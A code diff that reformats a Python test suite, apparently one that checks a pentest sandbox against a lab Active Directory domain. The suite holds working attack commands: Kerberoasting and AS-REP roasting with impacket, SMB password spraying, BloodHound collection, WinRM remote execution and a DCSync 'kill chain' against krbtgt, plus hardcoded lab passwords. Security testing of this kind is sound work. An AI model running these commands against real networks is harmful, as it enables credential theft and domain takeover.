@@ -36,7 +36,7 @@ _SRV = os.environ.get("LAB_TARGET_SRV", "")
 _DOMAIN = "portal.lab"
 _ADMIN = "administrator"
 _ADMIN_PASS = "LabAdmin1!"
-_SVC_BACKUP_PASS = "Backup123!"   # cracked from Kerberoast
+_SVC_BACKUP_PASS = "Backup123!"  # cracked from Kerberoast
 _LOCAL_ADMIN_PASS = "LabAdmin1!"
 
 
@@ -51,7 +51,9 @@ async def run() -> None:
 
     if not _lab_enabled():
         record(
-            sec, "S18-00", "Lab-exec lane enabled",
+            sec,
+            "S18-00",
+            "Lab-exec lane enabled",
             "WARN",
             "SANDBOX_LAB_EXEC not set or LAB_TARGET_DC empty — skipping S18",
         )
@@ -64,7 +66,9 @@ async def run() -> None:
     code, data = await _get(f"http://localhost:{sandbox_port}/health", timeout=5)
     lab_active = isinstance(data, dict) and data.get("lab_exec_active") is True
     record(
-        sec, "S18-01", "Sandbox health + lab-exec posture",
+        sec,
+        "S18-01",
+        "Sandbox health + lab-exec posture",
         "PASS" if code == 200 and lab_active else "WARN",
         f"HTTP {code} | lab_exec_active={lab_active}",
         t0=t0,
@@ -85,9 +89,12 @@ for p in ports:
     except Exception: pass
 " 2>&1"""
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {"code": _dc_scan, "timeout": 30},
-        section=sec, tid="S18-02", name=f"DC ({_DC}) AD port scan",
+        section=sec,
+        tid="S18-02",
+        name=f"DC ({_DC}) AD port scan",
         ok_fn=lambda t: "88/tcp open" in t and "389/tcp open" in t,
         warn_if=["network unreachable", "error"],
         timeout=60,
@@ -95,15 +102,17 @@ for p in ports:
 
     # ── S18-03: Kerberoast — 3 TGS hashes ────────────────────────────────────
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {
             "code": (
-                f"impacket-GetUserSPNs {_DOMAIN}/{_ADMIN}:{_ADMIN_PASS}"
-                f" -dc-ip {_DC} -request 2>&1"
+                f"impacket-GetUserSPNs {_DOMAIN}/{_ADMIN}:{_ADMIN_PASS} -dc-ip {_DC} -request 2>&1"
             ),
             "timeout": 60,
         },
-        section=sec, tid="S18-03", name="Kerberoast — 3 SPN hashes",
+        section=sec,
+        tid="S18-03",
+        name="Kerberoast — 3 SPN hashes",
         ok_fn=lambda t: t.count("$krb5tgs$") >= 3,
         warn_if=["[-] ", "KerberosError", "network unreachable"],
         timeout=90,
@@ -112,7 +121,8 @@ for p in ports:
     # ── S18-04: AS-REP roast — 2 hashes ──────────────────────────────────────
     # arya.stark + ned.stark have pre-auth disabled
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {
             "code": (
                 "printf 'arya.stark\\nned.stark\\n' > /tmp/users.txt && "
@@ -121,7 +131,9 @@ for p in ports:
             ),
             "timeout": 60,
         },
-        section=sec, tid="S18-04", name="AS-REP roast — arya.stark + ned.stark",
+        section=sec,
+        tid="S18-04",
+        name="AS-REP roast — arya.stark + ned.stark",
         ok_fn=lambda t: t.count("$krb5asrep$") >= 2,
         warn_if=["[-] ", "KerberosError", "network unreachable"],
         timeout=90,
@@ -130,7 +142,8 @@ for p in ports:
     # ── S18-05: Password spray (nxc SMB) ─────────────────────────────────────
     # Spray a short list against SMB — expect at least one valid hit
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {
             "code": (
                 "printf 'jon.snow\\ndarenerys.t\\n' > /tmp/spray_u.txt && "
@@ -140,7 +153,9 @@ for p in ports:
             ),
             "timeout": 90,
         },
-        section=sec, tid="S18-05", name="Password spray (nxc SMB) — valid hit",
+        section=sec,
+        tid="S18-05",
+        name="Password spray (nxc SMB) — valid hit",
         ok_fn=lambda t: "[+]" in t or "STATUS_SUCCESS" in t,
         warn_if=["[-] ", "network unreachable", "STATUS_LOGON_FAILURE"],
         timeout=120,
@@ -150,7 +165,8 @@ for p in ports:
     # Use -dc portal.lab (the domain itself resolves via -ns to the DC IP).
     # lab-dc01.portal.lab has no DNS A record; dns.resolver bypasses /etc/hosts.
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {
             "code": (
                 f"bloodhound-ce-python -u {_ADMIN} -p '{_ADMIN_PASS}'"
@@ -159,7 +175,9 @@ for p in ports:
             ),
             "timeout": 120,
         },
-        section=sec, tid="S18-06", name="BloodHound collection — graph data",
+        section=sec,
+        tid="S18-06",
+        name="BloodHound collection — graph data",
         ok_fn=lambda t: any(x in t for x in ["Compressing", "Done in"]),
         warn_if=["error", "exception", "network unreachable"],
         timeout=150,
@@ -170,15 +188,15 @@ for p in ports:
     # accounts from WinRM by default on Windows Server 2022.
     if _SRV:
         await _mcp(
-            sandbox_port, "execute_bash",
+            sandbox_port,
+            "execute_bash",
             {
-                "code": (
-                    f"nxc winrm {_SRV}"
-                    f" -u {_ADMIN} -p '{_ADMIN_PASS}' -x 'whoami /all' 2>&1"
-                ),
+                "code": (f"nxc winrm {_SRV} -u {_ADMIN} -p '{_ADMIN_PASS}' -x 'whoami /all' 2>&1"),
                 "timeout": 60,
             },
-            section=sec, tid="S18-07", name=f"WinRM exec on srv01 ({_SRV})",
+            section=sec,
+            tid="S18-07",
+            name=f"WinRM exec on srv01 ({_SRV})",
             ok_fn=lambda t: "[+]" in t or "nt authority" in t.lower(),
             warn_if=["[-] ", "network unreachable", "WINRM_NOT_AVAILABLE"],
             timeout=90,
@@ -250,9 +268,11 @@ sys.exit(0 if "krbtgt" in r.stdout.lower() else 1)
 PYEOF
 """
     await _mcp(
-        sandbox_port, "execute_bash",
+        sandbox_port,
+        "execute_bash",
         {"code": kill_chain, "timeout": 180},
-        section=sec, tid="S18-08",
+        section=sec,
+        tid="S18-08",
         name="Full kill chain: crack → ACL abuse → DCSync (resets AD)",
         ok_fn=lambda t: "krbtgt" in t.lower(),
         warn_if=["network unreachable", "sys.exit(1)"],
